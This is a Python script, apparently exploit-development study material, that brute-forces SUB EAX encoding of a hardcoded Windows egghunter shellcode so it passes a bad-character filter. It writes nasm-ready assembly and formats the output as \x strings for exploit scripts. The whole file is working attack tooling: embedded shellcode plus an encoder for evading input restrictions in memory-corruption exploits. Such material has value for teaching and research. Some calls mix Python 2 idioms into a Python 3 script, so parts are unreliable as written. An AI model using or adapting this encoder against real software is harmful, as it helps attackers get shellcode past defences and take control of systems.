#! /usr/bin/env python3

"""
Automating Shellcode Encoding Math
Author:         cmaddy
Description:    This script brute forces shellcode encoding with SUB EAX instructions.
                Provide shellcode in 4 byte chunks (DWORD) and a set of good
                characters and the script will produce the encoded version.
                This is a BRUTE FORCE method because very little logic is applied
                to the SUB EAX math. 0x55 is subtracted from bad chars and
                0x01 is subtracted from good chars. It works, but you may end up
                with many more instructions than if you had done this by hand.
"""

import re
import argparse
from binascii import hexlify

# We start with our egghunter shellcode in sets of 4 bytes for DWORD
# This was generated using `egghunt.exe cstyle CMAD`
egghunter = [
"\x66\x81\xca\xff",
"\x0f\x42\x52\x6a",
"\x02\x58\xcd\x2e",
"\x3c\x05\x5a\x74",
"\xef\xb8\x44\x41", # DA
"\x4D\x43\x8b\xfa", # MC
"\xaf\x75\xea\xaf",
"\x75\xe7\xff\xe7"
]

# Parse the command line arguments
parser = argparse.ArgumentParser()
parser.add_argument("--format", action="store", dest="format_argument", help="Provide a binary file produced by nasm to format into \\x format.")
args = parser.parse_args()


class Encoder(object):
    """A class for encoding shellcode. This class accepts shellcode that has been
    formatted into DWORD (4 bytes) and provided as a list. It then encodes this
    shellcode using the EAX register and SUB EAX commands. The list of good
    characters (good_chars) is used to check results and continue encoding until
    the result contains only characters found in the set of good characters.

    This is repeated for each DWORD. A list of instructions is assembled for the
    encoding of each DWORD and then all instructions are output, in the proper
    order, at the end. They are written to the encoded.asm file that can then be
    fed to nasm.

    This class can also take the bin file produced by nasm and format the final
    encoded shellcode into \\x format appropriate for exploit scripts.
    """
    # We have our list of acceptable characters
    # '0x' is included because it was an easy solution to a little problem and
    # won't affect the calculations
    # If this list is replaced/changed, keep '0x' in the list
    good_chars = ["0x", "01", "02", "03", "04", "05", "06", "07", "08", "09", "31", \
    "32", "33", "34", "35", "36", "37", "38", "39", "3b", "3c", "3d", "3e", "41", \
    "42", "43", "44", "45", "46", "47", "48", "49", "4a", "4b", "4c", "4d", "4e", \
    "4f", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "5a", "5b", \
    "5c", "5d", "5e", "5f", "60", "61", "62", "63", "64", "65", "66", "67", "68", \
    "69", "6a", "6b", "6c", "6d", "6e", "6f", "70", "71", "72", "73", "74", "75", \
    "76", "77", "78", "79", "7a", "7b", "7c", "7d", "7e", "7f"]

    # Setup the variables for the files
    OUTPUT_FILE = "encoded.asm"
    ENCODED_FILE = ""

    # Let's track the number of calculations, for science
    calculations = 0

    # Initiate the list to hold the hex version of the shellcode
    egg_hex = []

    # Hold the isntruction set for the final output
    instructions = []

    def run(self):
        """Run through each step in the proper sequence to encode the provided shellcode."""
        # Go through the default processing -- creatig an asm file with encoded instructions
        if not args.format_argument:
            self.prepare_shellcode(egghunter)
            # Process each DWORD in the shellcode individually
            for i in self.egg_hex:
                self.encode_shellcode(i)
            self.print_exit_statement()
            self.output_asm_file(self.instructions)
        # Do not encode -- process a bin file to produce \x formatted encoded instructions.
        else:
            self.ENCODED_FILE = args.format_argument
            self.format_binary()

    def convert_to_dword(self, shellcode):
        """Function for taking shellcode produced in \\x format and converting it to DWORD."""
        # This is in here for testing -- may move to accepting shellcode not formatted in DWORD
        # This works, but would require the rest of the code to be modified
        temp = hexlify(shellcode).decode('utf-8')
        pairs = 8
        temp_list = [temp[i:i+pairs] for i in range(0, len(temp), pairs)]
        print(temp_list)

    def to_hex(self, val, nbits):
        """This takes an int value and a bit width value. A hex value is returned
        for the provided bit width, e.g. 32-bit
        """
        # It doesn't seem to matter, but there are two ways to do this, the one below and:
        # return hex(val & (2**32-1))
        return hex((val + (1 << nbits)) % (1 << nbits))

    def prepare_shellcode(self, shellcode):
        """This function processes each DWORD value in the shellcode. It reverses
        the order of each DWORD and converts the value to hex for Little Endian.
        Then the list must be flipped so the last DWORD is processed first and placed on
        the stack first (the stack grows downward).

        e.g. \\x75\\xe7\\x7ff\\xe7 becomes 0xe7ffe775
        """
        print("[+] Converting egghunter shellcode to hex...")
        for i in egghunter:
            # Add each Little Endian value to our list
            self.egg_hex.append(i[::-1].encode('hex'))
        # Reverse the list order for the stack
        self.egg_hex.reverse()

    def encode_shellcode(self, i):
        """This function must be run against each DWORD value. Process the
        provided DWORD and append the instructions for that chunk to the
        instructions list for output with output_asm_file().
        """
        print("[+] Processing: 0x{}".format(i))
        # We use AND instrutions to zero EAX because they meet the good character criteria
        # An alternate option is XOR EAX,EAX (\x21\xc0), but \xc0 is a bad character for the good_char set
        self.instructions.append("AND EAX,0x554E4D4A")
        self.instructions.append("AND EAX,0x2A313235")

        # Boolean value to be used for the while loop
        keep_checking = True

        # Take the provided DWORD and subtract it from 0x0, e.g. 0x0 - 0xe7ffe775
        integer = int(i, 16)                # Convert hex to an integer for math
        chunk = 0 - integer                 # Subtract the integer value from zero
        chunk = self.to_hex(chunk, 32)      # Convert negative hex value to a 32-bit width value we can use

        # Take the result and split it into four sets of two numbers (individual bytes), e.g. 18 00 18 8B
        # Make sure we have something 10 characters long (four pairs and a '0x' pair)
        # This is kind of a hack, but it works for our purposes
        if len(chunk) == 10:
            # We have 10 characters, a complete value
            pairs = re.findall(r'..', chunk)
        elif len(chunk) == 9:
            # A zero was dropped, so add it back
            chunk = chunk[:2] + "0" + chunk[2:]
            pairs = re.findall(r'..', chunk)
        elif len(chunk) == 8:
            # Two zeroes were dropped, so add them back
            chunk = chunk[:2] + "00" + chunk[2:]
            pairs = re.findall(r'..', chunk)

        # Check if any of the resulting characters are not in the good characters list
        # If so perform a subtraction operation and check again
        print("[+] Subtracted from 0x0 to get: {}".format(chunk))
        print("[+] Doing cyber maths to make the bad characters go away...")

        # The following returns a list of any good chars found in the list of pairs
        # If length is not 4, then we have a bad char
        # 0x1800188b returns [] because it's all bad (length of 0)
        # 0x50158a51 returns ['50', '51'] because it has 50% good chars (length of 2)
        while keep_checking == True:
            # Remove the leading 0x for this part
            pairs.remove("0x")
            # Check the number of good characters
            num_good_chars = len([x for x in self.good_chars if x in pairs])
            # If we don't have 4 good characters, keep trying
            if num_good_chars < 4:
                # Assemble the subtraction value
                sub_value = ""
                # Add a 55 for bad characters and a 01 for good characters
                for x in pairs:
                    if x in self.good_chars:
                        sub_value += "01"   # Good value, so just subtract 01 (00 is NULL and a bad value)
                    else:
                        sub_value += "55"   # Bad value, so subtract 55

                # Perform the math with integers and return to hex
                integer = int(chunk.rstrip("L"), 16)
                sub_value = int(sub_value, 16)
                chunk = integer - sub_value
                chunk = self.to_hex(chunk, 32)

                # Like above, ensure we have 10 character values
                if len(chunk) == 10:
                    pairs = re.findall(r'..', chunk)
                elif len(chunk) == 9:
                    chunk = chunk[:2] + "0" + chunk[2:]
                    pairs = re.findall(r'..', chunk)
                elif len(chunk) == 8:
                    chunk = chunk[:2] + "00" + chunk[2:]
                    pairs = re.findall(r'..', chunk)

                # Convert the assembled subtraction value to hex
                sub_value = hex(sub_value)
                # Convert the hex value to a string to enforce leading zeroes
                # This is probably silly, but it's going to get the job done
                sub_value = str(sub_value)
                # The leading zero for a value starting with 01 is lost, so add it back
                if sub_value.startswith("0x1"):
                    sub_value = sub_value.replace("0x1", "0x01")
                # Print and append the final SUB EAX instruction
                print("[+] Result: {}".format(sub_value))
                self.instructions.append("SUB EAX,{}".format(sub_value))
                self.calculations += 1
            else:
                # Stop once all four pairs, e.g. 6C 54 6C 7b, are good characters
                keep_checking = False
                print("[+] Ding, ding! Good value is: {}".format(chunk))
                self.instructions.append("SUB EAX,{}".format(chunk))
                self.instructions.append("PUSH EAX")
                print("")

    def output_asm_file(self, instructions):
        """Create the asm file to hold the generated instructions and write each
        instructon on its own line.

        The [BITS 32] header is added to the top so nasm will accept it. Also, the
        instructions are written with the '0x' for nasm. i.e. SUB EAX,0x55555555.
        The '0x' would be left off if the instructions were to be typed into a
        debugger, but the intention is for this file to be used with nasm.
        """
        # Open the output file in binary mode for writing binary, obviously
        with open(self.OUTPUT_FILE, "w+b") as output:
            # Tack on this line for nasm
            output.write("[BITS 32]\n")
            # Write each instruction to the file on its own line
            for i in instructions:
                output.write(i + "\n")

    def print_exit_statement(self):
        """Just a helper function to print out some instructions and info at the end."""
        print("[+] Done! Total calculations: {}".format(self.calculations))
        print("[+] Take the encoded.asm output and compile it using nasm: nasm encoded.asm -o encoded.bin.")
        print("[+] Then feed the bin file into this script to get your shellcode in '\\x' format!")
        print("[+] Wonderful... let's get a shell.")

    def format_binary(self):
        """Take the contents of a binary file and output it in \\x format."""
        with open(self.ENCODED_FILE, "r+b") as encoded:
            temp = hexlify(encoded.read()).decode('utf-8')
            pairs = 2
            temp_list = [temp[i:i+pairs] for i in range(0, len(temp), pairs)]

        # Print our new shellcode with a handy byte count
        print("[+] Formatting complete: {} bytes".format(len(temp_list)))
        # This gets everything in one long string
        output = "\\x" + "\\x".join(temp_list)
        # This separates the shellcode into smaller pieces to better fit into a script
        # A length of 72 is used by default here to get 18 bytes in one line
        # The number includes the '\x', so account for 4 characters if you increase/decrease
        output = "\"" + "\"\n\"".join(self.splitAt(output, 72)) + "\""
        print(output)

    def splitAt(self, string, length):
        """Helper function to take an input string and output that string split
        into chunks in the requested size. This is used to output the formatted
        shellcode from format_binary() in smaller chunks rather than one large string.
        """
        for i in range(0, len(string), length):
            yield string[i:i + length]

if __name__ == "__main__":
    encoder = Encoder()
    encoder.run()
